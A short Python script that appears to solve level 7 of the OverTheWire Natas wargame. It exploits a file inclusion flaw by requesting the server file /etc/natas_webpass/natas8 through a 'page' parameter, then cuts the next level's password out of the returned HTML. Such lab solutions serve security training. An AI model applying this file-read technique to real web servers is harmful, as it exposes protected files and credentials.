import requests
from requests.auth import HTTPBasicAuth
import natas6solution

auth = HTTPBasicAuth('natas7', natas6solution.get_pass())
def get_pass():
    param = {'page':'/etc/natas_webpass/natas8'}
    r = requests.get('http://natas7.natas.labs.overthewire.org/', auth=auth,params=param)
    webcontent = r.text
#    print(webcontent)
    i = webcontent.find('About</a>')+20
    s = webcontent[i:i+32]
    return s
if __name__ == "__main__":
    solution = get_pass()
    print(solution)
